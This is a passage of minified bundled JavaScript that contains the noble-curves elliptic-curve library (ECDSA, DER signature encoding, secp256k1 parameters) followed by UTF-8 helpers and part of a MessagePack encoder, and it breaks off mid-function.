*/function Sz(r){r.lowS!==void 0&&Ey("lowS",r.lowS),r.prehash!==void 0&&Ey("prehash",r.prehash)}function KDe(r){const e=Hte(r);VC(e,{a:"field",b:"field"},{allowInfinityPoint:"boolean",allowedPrivateKeyLengths:"array",clearCofactor:"function",fromBytes:"function",isTorsionFree:"function",toBytes:"function",wrapPrivateKey:"boolean"});const{endo:t,Fp:i,a:n}=e;if(t){if(!i.eql(n,i.ZERO))throw new Error("invalid endo: CURVE.a must be 0");if(typeof t!="object"||typeof t.beta!="bigint"||typeof t.splitScalar!="function")throw new Error('invalid endo: expected "beta": bigint and "splitScalar": function')}return Object.freeze({...e})}let GDe=class extends Error{constructor(e=""){super(e)}};const Uh={Err:GDe,_tlv:{encode:(r,e)=>{const{Err:t}=Uh;if(r<0||r>256)throw new t("tlv.encode: wrong tag");if(e.length&1)throw new t("tlv.encode: unpadded data");const i=e.length/2,n=l8(i);if(n.length/2&128)throw new t("tlv.encode: long form length too big");const s=i>127?l8(n.length/2|128):"";return l8(r)+s+n+e},decode(r,e){const{Err:t}=Uh;let i=0;if(r<0||r>256)throw new t("tlv.encode: wrong tag");if(e.length<2||e[i++]!==r)throw new t("tlv.decode: wrong tlv");const n=e[i++],s=!!(n&128);let o=0;if(!s)o=n;else{const c=n&127;if(!c)throw new t("tlv.decode(long): indefinite length not supported");if(c>4)throw new t("tlv.decode(long): byte length is too big");const l=e.subarray(i,i+c);if(l.length!==c)throw new t("tlv.decode: length bytes not complete");if(l[0]===0)throw new t("tlv.decode(long): zero leftmost byte");for(const u of l)o=o<<8|u;if(i+=c,o<128)throw new t("tlv.decode(long): not minimal encoding")}const a=e.subarray(i,i+o);if(a.length!==o)throw new t("tlv.decode: wrong value length");return{v:a,l:e.subarray(i+o)}}},_int:{encode(r){const{Err:e}=Uh;if(r<Vh)throw new e("integer: negative integers are not allowed");let t=l8(r);if(Number.parseInt(t[0],16)&8&&(t="00"+t),t.length&1)throw new e("unexpected DER parsing assertion: unpadded hex");return t},decode(r){const{Err:e}=Uh;if(r[0]&128)throw new e("invalid signature integer: negative");if(r[0]===0&&!(r[1]&128))throw new e("invalid signature integer: unnecessary leading zero");return D1(r)}},toSig(r){const{Err:e,_int:t,_tlv:i}=Uh,n=Yc("signature",r),{v:s,l:o}=i.decode(48,n);if(o.length)throw new e("invalid signature: left bytes after parsing");const{v:a,l:c}=i.decode(2,s),{v:l,l:u}=i.decode(2,c);if(u.length)throw new e("invalid signature: left bytes after parsing");return{r:t.decode(a),s:t.decode(l)}},hexFromSig(r){const{_tlv:e,_int:t}=Uh,i=e.encode(2,t.encode(r.r)),n=e.encode(2,t.encode(r.s)),s=i+n;return e.encode(48,s)}};function KA(r,e){return _y(q4(r,e))}const Vh=BigInt(0),Ms=BigInt(1);BigInt(2);const GA=BigInt(3),ZDe=BigInt(4);function YDe(r){const e=KDe(r),{Fp:t}=e,i=fO(e.n,e.nBitLength),n=e.toBytes||((S,T,k)=>{const I=T.toAffine();return W7(Uint8Array.from([4]),t.toBytes(I.x),t.toBytes(I.y))}),s=e.fromBytes||(S=>{const T=S.subarray(1),k=t.fromBytes(T.subarray(0,t.BYTES)),I=t.fromBytes(T.subarray(t.BYTES,2*t.BYTES));return{x:k,y:I}});function o(S){const{a:T,b:k}=e,I=t.sqr(S),E=t.mul(I,S);return t.add(t.add(E,t.mul(S,T)),k)}function a(S,T){const k=t.sqr(T),I=o(S);return t.eql(k,I)}if(!a(e.Gx,e.Gy))throw new Error("bad curve params: generator point");const c=t.mul(t.pow(e.a,GA),ZDe),l=t.mul(t.sqr(e.b),BigInt(27));if(t.is0(t.add(c,l)))throw new Error("bad curve params: a or b");function u(S){return hO(S,Ms,e.n)}function d(S){const{allowedPrivateKeyLengths:T,nByteLength:k,wrapPrivateKey:I,n:E}=e;if(T&&typeof S!="bigint"){if(F4(S)&&(S=_y(S)),typeof S!="string"||!T.includes(S.length))throw new Error("invalid private key");S=S.padStart(k*2,"0")}let C;try{C=typeof S=="bigint"?S:D1(Yc("private key",S,k))}catch{throw new Error("invalid private key, expected hex or "+k+" bytes, got "+typeof S)}return I&&(C=Ea(C,E)),lw("private key",C,Ms,E),C}function h(S){if(!(S instanceof g))throw new Error("ProjectivePoint expected")}const f=xz((S,T)=>{const{px:k,py:I,pz:E}=S;if(t.eql(E,t.ONE))return{x:k,y:I};const C=S.is0();T==null&&(T=C?t.ONE:t.inv(E));const N=t.mul(k,T),L=t.mul(I,T),$=t.mul(E,T);if(C)return{x:t.ZERO,y:t.ZERO};if(!t.eql($,t.ONE))throw new Error("invZ was invalid");return{x:N,y:L}}),p=xz(S=>{if(S.is0()){if(e.allowInfinityPoint&&!t.is0(S.py))return;throw new Error("bad point: ZERO")}const{x:T,y:k}=S.toAffine();if(!t.isValid(T)||!t.isValid(k))throw new Error("bad point: x or y not FE");if(!a(T,k))throw new Error("bad point: equation left != right");if(!S.isTorsionFree())throw new Error("bad point: not in prime-order subgroup");return!0});class g{constructor(T,k,I){if(T==null||!t.isValid(T))throw new Error("x required");if(k==null||!t.isValid(k)||t.is0(k))throw new Error("y required");if(I==null||!t.isValid(I))throw new Error("z required");this.px=T,this.py=k,this.pz=I,Object.freeze(this)}static fromAffine(T){const{x:k,y:I}=T||{};if(!T||!t.isValid(k)||!t.isValid(I))throw new Error("invalid affine point");if(T instanceof g)throw new Error("projective point not allowed");const E=C=>t.eql(C,t.ZERO);return E(k)&&E(I)?g.ZERO:new g(k,I,t.ONE)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static normalizeZ(T){const k=Ute(t,T.map(I=>I.pz));return T.map((I,E)=>I.toAffine(k[E])).map(g.fromAffine)}static fromHex(T){const k=g.fromAffine(s(Yc("pointHex",T)));return k.assertValidity(),k}static fromPrivateKey(T){return g.BASE.multiply(d(T))}static msm(T,k){return VDe(g,i,T,k)}_setWindowSize(T){x.setWindowSize(this,T)}assertValidity(){p(this)}hasEvenY(){const{y:T}=this.toAffine();if(t.isOdd)return!t.isOdd(T);throw new Error("Field doesn't support isOdd")}equals(T){h(T);const{px:k,py:I,pz:E}=this,{px:C,py:N,pz:L}=T,$=t.eql(t.mul(k,L),t.mul(C,E)),y=t.eql(t.mul(I,L),t.mul(N,E));return $&&y}negate(){return new g(this.px,t.neg(this.py),this.pz)}double(){const{a:T,b:k}=e,I=t.mul(k,GA),{px:E,py:C,pz:N}=this;let L=t.ZERO,$=t.ZERO,y=t.ZERO,A=t.mul(E,E),b=t.mul(C,C),v=t.mul(N,N),_=t.mul(E,C);return _=t.add(_,_),y=t.mul(E,N),y=t.add(y,y),L=t.mul(T,y),$=t.mul(I,v),$=t.add(L,$),L=t.sub(b,$),$=t.add(b,$),$=t.mul(L,$),L=t.mul(_,L),y=t.mul(I,y),v=t.mul(T,v),_=t.sub(A,v),_=t.mul(T,_),_=t.add(_,y),y=t.add(A,A),A=t.add(y,A),A=t.add(A,v),A=t.mul(A,_),$=t.add($,A),v=t.mul(C,N),v=t.add(v,v),A=t.mul(v,_),L=t.sub(L,A),y=t.mul(v,b),y=t.add(y,y),y=t.add(y,y),new g(L,$,y)}add(T){h(T);const{px:k,py:I,pz:E}=this,{px:C,py:N,pz:L}=T;let $=t.ZERO,y=t.ZERO,A=t.ZERO;const b=e.a,v=t.mul(e.b,GA);let _=t.mul(k,C),O=t.mul(I,N),D=t.mul(E,L),R=t.add(k,I),P=t.add(C,N);R=t.mul(R,P),P=t.add(_,O),R=t.sub(R,P),P=t.add(k,E);let B=t.add(C,L);return P=t.mul(P,B),B=t.add(_,D),P=t.sub(P,B),B=t.add(I,E),$=t.add(N,L),B=t.mul(B,$),$=t.add(O,D),B=t.sub(B,$),A=t.mul(b,P),$=t.mul(v,D),A=t.add($,A),$=t.sub(O,A),A=t.add(O,A),y=t.mul($,A),O=t.add(_,_),O=t.add(O,_),D=t.mul(b,D),P=t.mul(v,P),O=t.add(O,D),D=t.sub(_,D),D=t.mul(b,D),P=t.add(P,D),_=t.mul(O,P),y=t.add(y,_),_=t.mul(B,P),$=t.mul(R,$),$=t.sub($,_),_=t.mul(R,O),A=t.mul(B,A),A=t.add(A,_),new g($,y,A)}subtract(T){return this.add(T.negate())}is0(){return this.equals(g.ZERO)}wNAF(T){return x.wNAFCached(this,T,g.normalizeZ)}multiplyUnsafe(T){const{endo:k,n:I}=e;lw("scalar",T,Vh,I);const E=g.ZERO;if(T===Vh)return E;if(this.is0()||T===Ms)return this;if(!k||x.hasPrecomputes(this))return x.wNAFCachedUnsafe(this,T,g.normalizeZ);let{k1neg:C,k1:N,k2neg:L,k2:$}=k.splitScalar(T),y=E,A=E,b=this;for(;N>Vh||$>Vh;)N&Ms&&(y=y.add(b)),$&Ms&&(A=A.add(b)),b=b.double(),N>>=Ms,$>>=Ms;return C&&(y=y.negate()),L&&(A=A.negate()),A=new g(t.mul(A.px,k.beta),A.py,A.pz),y.add(A)}multiply(T){const{endo:k,n:I}=e;lw("scalar",T,Ms,I);let E,C;if(k){const{k1neg:N,k1:L,k2neg:$,k2:y}=k.splitScalar(T);let{p:A,f:b}=this.wNAF(L),{p:v,f:_}=this.wNAF(y);A=x.constTimeNegate(N,A),v=x.constTimeNegate($,v),v=new g(t.mul(v.px,k.beta),v.py,v.pz),E=A.add(v),C=b.add(_)}else{const{p:N,f:L}=this.wNAF(T);E=N,C=L}return g.normalizeZ([E,C])[0]}multiplyAndAddUnsafe(T,k,I){const E=g.BASE,C=(L,$)=>$===Vh||$===Ms||!L.equals(E)?L.multiplyUnsafe($):L.multiply($),N=C(this,k).add(C(T,I));return N.is0()?void 0:N}toAffine(T){return f(this,T)}isTorsionFree(){const{h:T,isTorsionFree:k}=e;if(T===Ms)return!0;if(k)return k(g,this);throw new Error("isTorsionFree() has not been declared for the elliptic curve")}clearCofactor(){const{h:T,clearCofactor:k}=e;return T===Ms?this:k?k(g,this):this.multiplyUnsafe(e.h)}toRawBytes(T=!0){return Ey("isCompressed",T),this.assertValidity(),n(g,this,T)}toHex(T=!0){return Ey("isCompressed",T),_y(this.toRawBytes(T))}}g.BASE=new g(e.Gx,e.Gy,t.ONE),g.ZERO=new g(t.ZERO,t.ONE,t.ZERO);const{endo:w,nBitLength:m}=e,x=HDe(g,w?Math.ceil(m/2):m);return{CURVE:e,ProjectivePoint:g,normPrivateKeyToScalar:d,weierstrassEquation:o,isWithinCurveOrder:u}}function JDe(r){const e=Hte(r);return VC(e,{hash:"hash",hmac:"function",randomBytes:"function"},{bits2int:"function",bits2int_modN:"function",lowS:"boolean"}),Object.freeze({lowS:!0,...e})}function QDe(r){const e=JDe(r),{Fp:t,n:i,nByteLength:n,nBitLength:s}=e,o=t.BYTES+1,a=2*t.BYTES+1;function c(v){return Ea(v,i)}function l(v){return gN(v,i)}const{ProjectivePoint:u,normPrivateKeyToScalar:d,weierstrassEquation:h,isWithinCurveOrder:f}=YDe({...e,toBytes(v,_,O){const D=_.toAffine(),R=t.toBytes(D.x),P=W7;return Ey("isCompressed",O),O?P(Uint8Array.from([_.hasEvenY()?2:3]),R):P(Uint8Array.from([4]),R,t.toBytes(D.y))},fromBytes(v){const _=v.length,O=v[0],D=v.subarray(1);if(_===o&&(O===2||O===3)){const R=D1(D);if(!hO(R,Ms,t.ORDER))throw new Error("Point is not on curve");const P=h(R);let B;try{B=t.sqrt(P)}catch(K){const q=K instanceof Error?": "+K.message:"";throw new Error("Point is not on curve"+q)}const M=(B&Ms)===Ms;return(O&1)===1!==M&&(B=t.neg(B)),{x:R,y:B}}else if(_===a&&O===4){const R=t.fromBytes(D.subarray(0,t.BYTES)),P=t.fromBytes(D.subarray(t.BYTES,2*t.BYTES));return{x:R,y:P}}else{const R=o,P=a;throw new Error("invalid Point, expected length of "+R+", or uncompressed "+P+", got "+_)}}});function p(v){const _=i>>Ms;return v>_}function g(v){return p(v)?c(-v):v}const w=(v,_,O)=>D1(v.slice(_,O));class m{constructor(_,O,D){lw("r",_,Ms,i),lw("s",O,Ms,i),this.r=_,this.s=O,D!=null&&(this.recovery=D),Object.freeze(this)}static fromCompact(_){const O=n;return _=Yc("compactSignature",_,O*2),new m(w(_,0,O),w(_,O,2*O))}static fromDER(_){const{r:O,s:D}=Uh.toSig(Yc("DER",_));return new m(O,D)}assertValidity(){}addRecoveryBit(_){return new m(this.r,this.s,_)}recoverPublicKey(_){const{r:O,s:D,recovery:R}=this,P=E(Yc("msgHash",_));if(R==null||![0,1,2,3].includes(R))throw new Error("recovery id invalid");const B=R===2||R===3?O+e.n:O;if(B>=t.ORDER)throw new Error("recovery id 2 or 3 invalid");const M=(R&1)===0?"02":"03",W=u.fromHex(M+KA(B,t.BYTES)),K=l(B),q=c(-P*K),J=c(D*K),le=u.BASE.multiplyAndAddUnsafe(W,q,J);if(!le)throw new Error("point at infinify");return le.assertValidity(),le}hasHighS(){return p(this.s)}normalizeS(){return this.hasHighS()?new m(this.r,c(-this.s),this.recovery):this}toDERRawBytes(){return z7(this.toDERHex())}toDERHex(){return Uh.hexFromSig(this)}toCompactRawBytes(){return z7(this.toCompactHex())}toCompactHex(){const _=n;return KA(this.r,_)+KA(this.s,_)}}const x={isValidPrivateKey(v){try{return d(v),!0}catch{return!1}},normPrivateKeyToScalar:d,randomPrivateKey:()=>{const v=qte(e.n);return qDe(e.randomBytes(v),e.n)},precompute(v=8,_=u.BASE){return _._setWindowSize(v),_.multiply(BigInt(3)),_}};function S(v,_=!0){return u.fromPrivateKey(v).toRawBytes(_)}function T(v){if(typeof v=="bigint")return!1;if(v instanceof u)return!0;const O=Yc("key",v).length,D=t.BYTES,R=D+1,P=2*D+1;if(!(e.allowedPrivateKeyLengths||n===R))return O===R||O===P}function k(v,_,O=!0){if(T(v)===!0)throw new Error("first arg must be private key");if(T(_)===!1)throw new Error("second arg must be public key");return u.fromHex(_).multiply(d(v)).toRawBytes(O)}const I=e.bits2int||function(v){if(v.length>8192)throw new Error("input is too large");const _=D1(v),O=v.length*8-s;return O>0?_>>BigInt(O):_},E=e.bits2int_modN||function(v){return c(I(v))},C=HC(s);function N(v){return lw("num < 2^"+s,v,Vh,C),q4(v,n)}function L(v,_,O=$){if(["recovered","canonical"].some(U=>U in O))throw new Error("sign() legacy options not supported");const{hash:D,randomBytes:R}=e;let{lowS:P,prehash:B,extraEntropy:M}=O;P==null&&(P=!0),v=Yc("msgHash",v),Sz(O),B&&(v=Yc("prehashed msgHash",D(v)));const W=E(v),K=d(_),q=[N(K),N(W)];if(M!=null&&M!==!1){const U=M===!0?R(t.BYTES):M;q.push(Yc("extraEntropy",U))}const J=W7(...q),le=W;function ae(U){const G=I(U);if(!f(G))return;const Z=l(G),j=u.BASE.multiply(G).toAffine(),Y=c(j.x);if(Y===Vh)return;const se=c(Z*c(le+Y*K));if(se===Vh)return;let ne=(j.x===Y?0:2)|Number(j.y&Ms),Te=se;return P&&p(se)&&(Te=g(se),ne^=1),new m(Y,Te,ne)}return{seed:J,k2sig:ae}}const $={lowS:e.lowS,prehash:!1},y={lowS:e.lowS,prehash:!1};function A(v,_,O=$){const{seed:D,k2sig:R}=L(v,_,O),P=e;return RDe(P.hash.outputLen,P.nByteLength,P.hmac)(D,R)}u.BASE._setWindowSize(8);function b(v,_,O,D=y){const R=v;_=Yc("msgHash",_),O=Yc("publicKey",O);const{lowS:P,prehash:B,format:M}=D;if(Sz(D),"strict"in D)throw new Error("options.strict was renamed to lowS");if(M!==void 0&&M!=="compact"&&M!=="der")throw new Error("format must be compact or der");const W=typeof R=="string"||F4(R),K=!W&&!M&&typeof R=="object"&&R!==null&&typeof R.r=="bigint"&&typeof R.s=="bigint";if(!W&&!K)throw new Error("invalid signature, expected Uint8Array, hex string or Signature instance");let q,J;try{if(K&&(q=new m(R.r,R.s)),W){try{M!=="compact"&&(q=m.fromDER(R))}catch(ne){if(!(ne instanceof Uh.Err))throw ne}!q&&M!=="der"&&(q=m.fromCompact(R))}J=u.fromHex(O)}catch{return!1}if(!q||P&&q.hasHighS())return!1;B&&(_=e.hash(_));const{r:le,s:ae}=q,U=E(_),G=l(ae),Z=c(U*G),j=c(le*G),Y=u.BASE.multiplyAndAddUnsafe(J,Z,j)?.toAffine();return Y?c(Y.x)===le:!1}return{CURVE:e,getPublicKey:S,getSharedSecret:k,sign:A,verify:b,ProjectivePoint:u,Signature:m,utils:x}}/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */function XDe(r){return{hash:r,hmac:(e,...t)=>iee(r,e,Rhe(...t)),randomBytes:Ohe}}function eLe(r,e){const t=i=>QDe({...r,...XDe(i)});return{...t(e),create:t}}/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const Vte=BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f"),Az=BigInt("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141"),tLe=BigInt(0),rLe=BigInt(1),wN=BigInt(2),Iz=(r,e)=>(r+e/wN)/e;function iLe(r){const e=Vte,t=BigInt(3),i=BigInt(6),n=BigInt(11),s=BigInt(22),o=BigInt(23),a=BigInt(44),c=BigInt(88),l=r*r*r%e,u=l*l*r%e,d=Dc(u,t,e)*u%e,h=Dc(d,t,e)*u%e,f=Dc(h,wN,e)*l%e,p=Dc(f,n,e)*f%e,g=Dc(p,s,e)*p%e,w=Dc(g,a,e)*g%e,m=Dc(w,c,e)*w%e,x=Dc(m,a,e)*g%e,S=Dc(x,t,e)*u%e,T=Dc(S,o,e)*p%e,k=Dc(T,i,e)*l%e,I=Dc(k,wN,e);if(!bN.eql(bN.sqr(I),r))throw new Error("Cannot find square root");return I}const bN=fO(Vte,void 0,void 0,{sqrt:iLe}),nLe=eLe({a:tLe,b:BigInt(7),Fp:bN,n:Az,Gx:BigInt("55066263022277343669578718895168534326250603453777594175500187360389116729240"),Gy:BigInt("32670510020758816978083085130507043184471273380659243275938904335757337482424"),h:BigInt(1),lowS:!0,endo:{beta:BigInt("0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"),splitScalar:r=>{const e=Az,t=BigInt("0x3086d221a7d46bcde86c90e49284eb15"),i=-rLe*BigInt("0xe4437ed6010e88286f547fa90abfe4c3"),n=BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8"),s=t,o=BigInt("0x100000000000000000000000000000000"),a=Iz(s*r,e),c=Iz(-i*r,e);let l=Ea(r-a*t-c*n,e),u=Ea(-a*i-c*s,e);const d=l>o,h=u>o;if(d&&(l=e-l),h&&(u=e-u),l>o||u>o)throw new Error("splitScalar: Endomorphism failed, k="+r);return{k1neg:d,k1:l,k2neg:h,k2:u}}}},UY),sLe=Object.freeze(Object.defineProperty({__proto__:null,secp256k1:nLe},Symbol.toStringTag,{value:"Module"}));function oLe(r){const e=r.length;let t=0,i=0;for(;i<e;){let n=r.charCodeAt(i++);if((n&4294967168)===0){t++;continue}else if((n&4294965248)===0)t+=2;else{if(n>=55296&&n<=56319&&i<e){const s=r.charCodeAt(i);(s&64512)===56320&&(++i,n=((n&1023)<<10)+(s&1023)+65536)}(n&4294901760)===0?t+=3:t+=4}}return t}function aLe(r,e,t){const i=r.length;let n=t,s=0;for(;s<i;){let o=r.charCodeAt(s++);if((o&4294967168)===0){e[n++]=o;continue}else if((o&4294965248)===0)e[n++]=o>>6&31|192;else{if(o>=55296&&o<=56319&&s<i){const a=r.charCodeAt(s);(a&64512)===56320&&(++s,o=((o&1023)<<10)+(a&1023)+65536)}(o&4294901760)===0?(e[n++]=o>>12&15|224,e[n++]=o>>6&63|128):(e[n++]=o>>18&7|240,e[n++]=o>>12&63|128,e[n++]=o>>6&63|128)}e[n++]=o&63|128}}const cLe=new TextEncoder,lLe=50;function uLe(r,e,t){cLe.encodeInto(r,e.subarray(t))}function dLe(r,e,t){r.length>lLe?uLe(r,e,t):aLe(r,e,t)}const hLe=4096;function Kte(r,e,t){let i=e;const n=i+t,s=[];let o="";for(;i<n;){const a=r[i++];if((a&128)===0)s.push(a);else if((a&224)===192){const c=r[i++]&63;s.push((a&31)<<6|c)}else if((a&240)===224){const c=r[i++]&63,l=r[i++]&63;s.push((a&31)<<12|c<<6|l)}else if((a&248)===240){const c=r[i++]&63,l=r[i++]&63,u=r[i++]&63;let d=(a&7)<<18|c<<12|l<<6|u;d>65535&&(d-=65536,s.push(d>>>10&1023|55296),d=56320|d&1023),s.push(d)}else s.push(a);s.length>=hLe&&(o+=String.fromCharCode(...s),s.length=0)}return s.length>0&&(o+=String.fromCharCode(...s)),o}const fLe=new TextDecoder,pLe=200;function gLe(r,e,t){const i=r.subarray(e,e+t);return fLe.decode(i)}function mLe(r,e,t){return t>pLe?gLe(r,e,t):Kte(r,e,t)}class u8{constructor(e,t){this.type=e,this.data=t}}class tc extends Error{constructor(e){super(e);const t=Object.create(tc.prototype);Object.setPrototypeOf(this,t),Object.defineProperty(this,"name",{configurable:!0,enumerable:!1,value:tc.name})}}const kb=4294967295;function wLe(r,e,t){const i=t/4294967296,n=t;r.setUint32(e,i),r.setUint32(e+4,n)}function Gte(r,e,t){const i=Math.floor(t/4294967296),n=t;r.setUint32(e,i),r.setUint32(e+4,n)}function Zte(r,e){const t=r.getInt32(e),i=r.getUint32(e+4);return t*4294967296+i}function bLe(r,e){const t=r.getUint32(e),i=r.getUint32(e+4);return t*4294967296+i}const vLe=-1,yLe=4294967296-1,xLe=17179869184-1;function CLe({sec:r,nsec:e}){if(r>=0&&e>=0&&r<=xLe)if(e===0&&r<=yLe){const t=new Uint8Array(4);return new DataView(t.buffer).setUint32(0,r),t}else{const t=r/4294967296,i=r&4294967295,n=new Uint8Array(8),s=new DataView(n.buffer);return s.setUint32(0,e<<2|t&3),s.setUint32(4,i),n}else{const t=new Uint8Array(12),i=new DataView(t.buffer);return i.setUint32(0,e),Gte(i,4,r),t}}function ELe(r){const e=r.getTime(),t=Math.floor(e/1e3),i=(e-t*1e3)*1e6,n=Math.floor(i/1e9);return{sec:t+n,nsec:i-n*1e9}}function _Le(r){if(r instanceof Date){const e=ELe(r);return CLe(e)}else return null}function SLe(r){const e=new DataView(r.buffer,r.byteOffset,r.byteLength);switch(r.byteLength){case 4:return{sec:e.getUint32(0),nsec:0};case 8:{const t=e.getUint32(0),i=e.getUint32(4),n=(t&3)*4294967296+i,s=t>>>2;return{sec:n,nsec:s}}case 12:{const t=Zte(e,4),i=e.getUint32(0);return{sec:t,nsec:i}}default:throw new tc(`Unrecognized data size for timestamp (expected 4, 8, or 12): ${r.length}`)}}function ALe(r){const e=SLe(r);return new Date(e.sec*1e3+e.nsec/1e6)}const ILe={type:vLe,encode:_Le,decode:ALe};class H7{constructor(){this.builtInEncoders=[],this.builtInDecoders=[],this.encoders=[],this.decoders=[],this.register(ILe)}register({type:e,encode:t,decode:i}){if(e>=0)this.encoders[e]=t,this.decoders[e]=i;else{const n=-1-e;this.builtInEncoders[n]=t,this.builtInDecoders[n]=i}}tryToEncode(e,t){for(let i=0;i<this.builtInEncoders.length;i++){const n=this.builtInEncoders[i];if(n!=null){const s=n(e,t);if(s!=null){const o=-1-i;return new u8(o,s)}}}for(let i=0;i<this.encoders.length;i++){const n=this.encoders[i];if(n!=null){const s=n(e,t);if(s!=null){const o=i;return new u8(o,s)}}}return e instanceof u8?e:null}decode(e,t,i){const n=t<0?this.builtInDecoders[-1-t]:this.decoders[t];return n?n(e,t,i):new u8(t,e)}}H7.defaultCodec=new H7;function TLe(r){return r instanceof ArrayBuffer||typeof SharedArrayBuffer<"u"&&r instanceof SharedArrayBuffer}function vN(r){return r instanceof Uint8Array?r:ArrayBuffer.isView(r)?new Uint8Array(r.buffer,r.byteOffset,r.byteLength):TLe(r)?new Uint8Array(r):Uint8Array.from(r)}const kLe=100,NLe=2048;class pO{constructor(e){this.entered=!1,this.extensionCodec=e?.extensionCodec??H7.defaultCodec,this.context=e?.context,this.useBigInt64=e?.useBigInt64??!1,this.maxDepth=e?.maxDepth??kLe,this.initialBufferSize=e?.initialBufferSize??NLe,this.sortKeys=e?.sortKeys??!1,this.forceFloat32=e?.forceFloat32??!1,this.ignoreUndefined=e?.ignoreUndefined??!1,this.forceIntegerToFloat=e?.forceIntegerToFloat??!1,this.pos=0,this.view=new DataView(new ArrayBuffer(this.initialBufferSize)),this.bytes=new Uint8Array(this.view.buffer)}clone(){return new pO({extensionCodec:this.extensionCodec,context:this.context,useBigInt64:this.useBigInt64,maxDepth:this.maxDepth,initialBufferSize:this.initialBufferSize,sortKeys:this.sortKeys,forceFloat32:this.forceFloat32,ignoreUndefined:this.ignoreUndefined,forceIntegerToFloat:this.forceIntegerToFloat})}reinitializeState(){this.pos=0}encodeSharedRef(e){if(this.entered)return this.clone().encodeSharedRef(e);try{return this.entered=!0,this.reinitializeState(),this.doEncode(e,1),this.bytes.subarray(0,this.pos)}finally{this.entered=!1}}encode(e){if(this.entered)return this.clone().encode(e);try{return this.entered=!0,this.reinitializeState(),this.doEncode(e,1),this.bytes.slice(0,this.pos)}finally{this.entered=!1}}doEncode(e,t){if(t>this.maxDepth)throw new Error(`Too deep objects in depth ${t}`);e==null?this.encodeNil():typeof e=="boolean"?this.encodeBoolean(e):typeof e=="number"?this.forceIntegerToFloat?this.encodeNumberAsFloat(e):this.encodeNumber(e):typeof e=="string"?this.encodeString(e):this.useBigInt64&&typeof e=="bigint"?this.encodeBigInt64(e):this.encodeObject(e,t)}ensureBufferSizeToWrite(e){const t=this.pos+e;this.view.byteLength<t&&this.resizeBuffer(t*2)}resizeBuffer(e){const t=new ArrayBuffer(e),i=new Uint8Array(t),n=new DataView(t);i.set(this.bytes),this.view=n,this.bytes=i}encodeNil(){this.writeU8(192)}encodeBoolean(e){e===!1?this.writeU8(194):this.writeU8(195)}encodeNumber(e){!this.forceIntegerToFloat&&Number.isSafeInteger(e)?e>=0?e<128?this.writeU8(e):e<256?(this.writeU8(204),this.writeU8(e)):e<65536?(this.writeU8(205),this.writeU16(e)):e<4294967296?(this.writeU8(206),this.writeU32(e)):this.useBigInt64?this.encodeNumberAsFloat(e):(this.writeU8(207),this.writeU64(e)):e>=-32?this.writeU8(224|e+32):e>=-128?(this.writeU8(208),this.writeI8(e)):e>=-32768?(this.writeU8(209),this.writeI16(e)):e>=-2147483648?(this.writeU8(210),this.writeI32(e)):this.useBigInt64?this.encodeNumberAsFloat(e):(this.writeU8(211),this.writeI64(e)):this.encodeNumberAsFloat(e)}encodeNumberAsFloat(e){this.forceFloat32?(this.writeU8(202),this.writeF32(e)):(this.writeU8(203),this.writeF64(e))}encodeBigInt64(e){e>=BigInt(0)?(this.writeU8(207),this.writeBigUint64(e)):(this.writeU8(211),this.writeBigInt64(e))}writeStringHeader(e){if(e<32)this.writeU8(160+e);else if(e<256)this.writeU8(217),this.writeU8(e);else if(e<65536)this.writeU8(218),this.writeU16(e);else if(e<4294967296)this.writeU8(219),this.writeU32(e);else throw new Error(`Too long string: ${e} bytes in UTF-8`)}encodeString(e){const i=oLe(e);this.ensureBufferSizeToWrite(5+i),this.writeStringHeader(i),dLe(e,this.bytes,this.pos),this.pos+=i}encodeObject(e,t){const i=this.extensionCodec.tryToEncode(e,this.context);if(i!=null)this.encodeExtension(i);else if(Array.isArray(e))this.encodeArray(e,t);else if(ArrayBuffer.isView(e))this.encodeBinary(e);else if(typeof e=="object")this.encodeMap(e,t);else throw new Error(`Unrecognized object: ${Object.prototype.toString.apply(e)}`)}encodeBinary(e){const t=e.byteLength;if(t<256)this.writeU8(196),this.writeU8(t);else if(t<65536)this.writeU8(197),this.writeU16(t);else if(t<4294967296)this.writeU8(198),this.writeU32(t);else throw new Error(`Too large binary: ${t}`);const i=vN(e);this.writeU8a(i)}encodeArray(e,t){const i=e.length;if(i<16)this.writeU8(144+i);else if(i<65536)this.writeU8(220),this.writeU16(i);else if(i<4294967296)this.writeU8(221),this.writeU32(i);else throw new Error(`Too large array: ${i}`);for(const n of e)this.doEncode(n,t+1)}countWithoutUndefined(e,t){let i=0;for(const n of t)e[n]!==void 0&&i++;return i}encodeMap(e,t){const i=Object.keys(e);this.sortKeys&&i.sort();const n=this.ignoreUndefined?this.countWithoutUndefined(e,i):i.length;if(n<16)this.writeU8(128+n);else if(n<65536)this.writeU8(222),this.writeU16(n);else if(n<4294967296)this.writeU8(223),this.writeU32(n);else throw new Error(`Too large map object: ${n}`);for(const s of i){const o=e[s];this.ignoreUndefined&&o===void 0||(this.encodeString(s),this.doEncode(o,t+1))}}encodeExtension(e){if(typeof e.data=="function"){const i=e.data(this.pos+6),n=i.length;if(n>=4294967296)throw new Error(`Too large extension object: ${n}`);this.writeU8(201),this.writeU32(n),this.writeI8(e.type),this.writeU8a(i);return}const t=e.data.length;if(t===1)this.writeU8(212);else if(t===2)this.writeU8(213);else if(t===4)this.writeU8(214);else if(t===8)this.writeU8(215);else if(t===16)this.writeU8(216);else if(t<256)this.writeU8(199),this.writeU8(t);else if(t<65536)this.writeU8(200),this.writeU16(t);else if(t<4294967296)this.writeU8(201),this.writeU32(t);else throw new Error(`Too large extension object: ${t}`);this.writeI8(e.type),this.writeU8a(e.data)}writeU8(e){this.ensureBufferSizeToWrite(1),this.view.setUint8(this.pos,e),this.pos++}writeU8a(e){const 